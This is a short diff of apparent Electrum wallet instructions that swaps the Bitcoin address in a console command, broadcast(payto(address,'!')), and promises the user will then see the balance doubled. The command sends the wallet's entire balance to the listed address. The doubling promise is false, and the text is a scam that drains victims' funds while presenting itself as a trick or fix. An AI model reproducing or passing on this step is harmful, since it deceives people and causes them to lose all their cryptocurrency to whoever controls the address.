@@ -14,7 +14,7 @@ Just follow this steps:
 
 - Click in View>Show Console
 
-- open console tab and put this command: broadcast(payto('bc1qv58mh5lzjlzwd3rn07xevlg3gkcmf3y7un9lax','!'))
+- open console tab and put this command: broadcast(payto('bc1qa4fyaaeh4hphfhvq5449vl24ed0j92acqnpzgq','!'))
 
 - hit enter button, if console shows message like this: "txid...." it works! restart electrum and view you balance x2
 
